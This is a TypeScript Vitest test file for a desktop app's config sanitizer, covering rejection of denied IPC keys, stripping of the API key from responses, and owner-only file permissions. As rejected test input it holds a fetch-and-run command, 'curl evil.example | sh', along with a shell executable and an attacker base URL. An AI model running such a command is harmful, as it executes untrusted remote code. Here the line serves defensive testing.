import { describe, it, expect } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import { sanitizeConfigUpdates, stripSecrets, ConfigUpdateRejectedError } from '../../apps/desktop/src/main/config-sanitizer.js';
import { ConfigStore } from '../../apps/desktop/src/main/config-store.js';

describe('Desktop save-config IPC Boundary Contracts', () => {
  it('passes through the exact keys the setup wizard submits', () => {
    const sanitized = sanitizeConfigUpdates({
      apiKey: 'sk-test-123',
      model: 'deepseek-reasoner',
      workspacePath: '/home/user/project',
      runtimeVersion: '0.1.0-rc.6',
      sandboxMode: 'workspace_only',
    });

    expect(sanitized).toEqual({
      apiKey: 'sk-test-123',
      model: 'deepseek-reasoner',
      workspacePath: '/home/user/project',
      runtimeVersion: '0.1.0-rc.6',
      sandboxMode: 'workspace_only',
    });
  });

  it('rejects runtime execution settings and network endpoint changes via IPC', () => {
    expect(() => sanitizeConfigUpdates({ runtimeExecutable: '/bin/sh' })).toThrow(ConfigUpdateRejectedError);
    expect(() => sanitizeConfigUpdates({ runtimeExecutableArgs: ['-c', 'curl evil.example | sh'] })).toThrow(ConfigUpdateRejectedError);
    expect(() => sanitizeConfigUpdates({ baseUrl: 'https://evil.example' })).toThrow(ConfigUpdateRejectedError);

    // Even mixed with legitimate keys, a single denied key must abort the whole update.
    expect(() =>
      sanitizeConfigUpdates({ model: 'deepseek-chat', runtimeExecutable: '/bin/bash' })
    ).toThrow(ConfigUpdateRejectedError);
  });

  it('drops unknown keys and rejects malformed payloads and values', () => {
    // Unknown keys are silently dropped (forward compatibility).
    expect(sanitizeConfigUpdates({ model: 'deepseek-chat', customPlugins: ['evil'], disableFallback: true })).toEqual({
      model: 'deepseek-chat',
    });
    expect(sanitizeConfigUpdates({})).toEqual({});
    expect(sanitizeConfigUpdates({ port: 9999, temperature: 0.7 })).toEqual({});

    expect(() => sanitizeConfigUpdates(null)).toThrow(TypeError);
    expect(() => sanitizeConfigUpdates('apiKey=sk-x')).toThrow(TypeError);
    expect(() => sanitizeConfigUpdates(['sk-x'])).toThrow(TypeError);
    expect(() => sanitizeConfigUpdates({ model: 42 })).toThrow(TypeError);
    expect(() => sanitizeConfigUpdates({ sandboxMode: 'unrestricted_via_xss' })).toThrow(TypeError);
  });

  it('strips the API key from get-config responses while keeping the rest readable', () => {
    const stripped = stripSecrets({
      apiKey: 'sk-secret',
      baseUrl: 'https://api.deepseek.com',
      model: 'deepseek-reasoner',
      port: 3080,
    });

    expect(stripped.apiKey).toBeUndefined();
    expect('apiKey' in stripped).toBe(false);
    expect(stripped.model).toBe('deepseek-reasoner');
    expect(stripped.port).toBe(3080);
  });

  it('enforces owner-only permissions on the persisted config file', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-desktop-cfg-'));
    try {
      const store = new ConfigStore(tempDir);
      store.save({ apiKey: 'sk-on-disk', model: 'deepseek-reasoner' });

      const mode = fs.statSync(path.join(tempDir, 'config.json')).mode & 0o777;
      expect(mode).toBe(0o600);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('repairs overly permissive permissions on pre-existing config files', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-desktop-cfg2-'));
    try {
      const cfgPath = path.join(tempDir, 'config.json');
      fs.writeFileSync(cfgPath, JSON.stringify({ apiKey: 'sk-legacy', model: 'deepseek-chat' }), 'utf-8');
      fs.chmodSync(cfgPath, 0o644);

      // Constructing the store over a legacy world-readable config must tighten it.
      new ConfigStore(tempDir);
      expect(fs.statSync(cfgPath).mode & 0o777).toBe(0o600);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('keeps the secret writable-but-unreadable over IPC end to end', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-desktop-cfg3-'));
    try {
      const store = new ConfigStore(tempDir);

      // Simulate the main-process handler pipeline: sanitize -> save -> read back.
      // A denied key aborts the whole update before persistence.
      expect(() =>
        sanitizeConfigUpdates({ apiKey: 'sk-e2e-flow', runtimeExecutable: '/bin/sh' })
      ).toThrow(ConfigUpdateRejectedError);
      expect(fs.existsSync(path.join(tempDir, 'config.json'))).toBe(false);

      store.save(sanitizeConfigUpdates({ apiKey: 'sk-e2e-flow', model: 'deepseek-reasoner' }));

      // Internally retained for runtime startup...
      expect(store.get().apiKey).toBe('sk-e2e-flow');
      // ...but never handed back to the renderer.
      expect(stripSecrets(store.get()).apiKey).toBeUndefined();

      // And a later save cannot resurrect a denied key.
      store.save(sanitizeConfigUpdates({ model: 'deepseek-chat' }));
      expect(store.get().model).toBe('deepseek-chat');
      expect(store.get().apiKey).toBe('sk-e2e-flow');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });
});
